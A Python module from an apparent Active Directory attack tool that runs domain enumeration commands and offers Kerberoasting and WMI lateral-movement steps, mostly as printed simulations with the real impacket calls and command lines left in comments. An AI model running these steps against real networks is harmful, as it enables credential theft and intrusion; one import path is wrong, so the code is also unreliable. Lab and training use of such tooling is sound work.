# phantomhunt/modules/phase3.py
import subprocess
import os
from rich.console import Console
from rich.table import Table
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from impacket.dcerpc.v5 import samr, transport
import getpass

console = Console()


def get_domain_info():
    """Basic domain enumeration using whoami /all and nltest"""
    console.print("\n[bold cyan]=== PHASE 3: DOMAIN ENUMERATION ===[/]")

    table = Table(title="Domain Information")
    table.add_column("Item")
    table.add_column("Value")

    try:
        whoami = subprocess.check_output("whoami /all", text=True)
        for line in whoami.splitlines():
            if "User Name" in line or "Group Name" in line or "Logon Domain" in line:
                parts = line.split()
                if len(parts) >= 3:
                    table.add_row(parts[0] + " " + parts[1], " ".join(parts[2:]))

        nltest = subprocess.check_output("nltest /dsgetdc:", text=True)
        for line in nltest.splitlines():
            if "DC:" in line or "Domain:" in line or "Address:" in line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    table.add_row(parts[0].strip(), parts[1].strip())

        console.print(table)
    except Exception as e:
        console.print(f"[red]Error getting domain info: {e}[/] (Are you on a domain-joined Windows?)")


def find_kerberoastable():
    """Very basic kerberoastable account detection + roast attempt"""
    console.print("\n[bold yellow]Looking for Kerberoastable accounts...[/]")

    try:
        # This requires elevated rights or proper delegation in most environments
        # We're doing a very simplified version - real tools use LDAP
        console.print("[yellow]Note: Full Kerberoasting usually needs LDAP access[/]")
        console.print("[yellow]Trying simple roast simulation (needs valid TGT first)[/]")

        domain = input("Enter domain name (example.com): ").strip()
        username = input("Enter username to roast service account (e.g. svc_sql): ").strip()
        password = getpass.getpass("Enter password for initial authentication (or blank for current): ")

        # if not domain or not username:
        #     console.print("[red]Domain and username required[/]")
        #     return
        if not domain or not username:
            console.print("[red]Domain and username required[/]")
            return

        # ────────────── REAL VERSION (commented - uncomment in isolated lab only) ──────────────
        # from impacket.examples.secretsdump import GetUserSPNs
        # # Example: spn = f"{domain}/{username}"
        # # Then call impacket to request TGS and extract hash
        # console.print("[green]Real Kerberoasting would use impacket GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/<user>:<pass>[/]")
        # # hashes = GetUserSPNs(...)  # add real call here

        # Very simplified - in real life you'd use GetUserSPNs.py from impacket
        console.print(f"[green]Would request TGS for {username}@{domain} (SPN check skipped for simplicity)[/]")
        console.print("[yellow]In production version: use impacket GetUserSPNs.py -request -dc-ip ...[/]")

        table = Table(title="Kerberoasting Simulation")
        table.add_column("Step")
        table.add_column("Status")
        table.add_row("TGT Acquisition", "[yellow]Simulated[/]")
        table.add_row("TGS Request", "[yellow]Would be requested here[/]")
        table.add_row("Hash Extraction", "[yellow]Hash would be saved[/]")
        console.print(table)

    except Exception as e:
        console.print(f"[red]Kerberoasting simulation failed: {e}[/]")


def simple_lateral_attempt():
    """Very basic WMI / SMB lateral movement demo using impacket"""
    console.print("\n[bold magenta]Basic Lateral Movement Simulation (DEMO ONLY)[/]")
    console.print("[red]!!! THIS IS DANGEROUS IN REAL ENVIRONMENTS - LAB ONLY !!![/]")

    target = input("Target IP/hostname (lab machine only!): ").strip()
    username = input("Username (domain\\user or local): ").strip()
    password = getpass.getpass("Password: ")

    if not target:
        console.print("[red]Target required[/]")
        return

    console.print(f"[yellow]Attempting WMI exec on {target} as {username}...[/]")

    try:
        # ────────────── REAL VERSION (commented - uncomment in isolated lab only) ──────────────
        # from impacket.examples.wmiexec import WMIEXEC
        # executer = WMIEXEC(username, password, domain=None, hashes=None, aesKey=None, k=False, noOutput=False)
        # output = executer.run(target, "whoami")
        # console.print("[green]Real WMI exec output:", output)
        # Or use: wmiexec.py domain/user:pass@target_ip "whoami"
        # # This is just a simulation message - real impacket wmiexec would be here
        # # In full version we would call: wmiexec.py domain/user:password@target "whoami"
        console.print("[green]In full implementation: impacket wmiexec.py would run command[/]")
        console.print("[yellow]Successful lateral movement would show output from target[/]")
    except Exception as e:
        console.print(f"[red]Lateral attempt failed (expected in demo): {e}[/]")


def phase3():
    get_domain_info()
    find_kerberoastable()
    simple_lateral_attempt()


if __name__ == "__main__":
    phase3()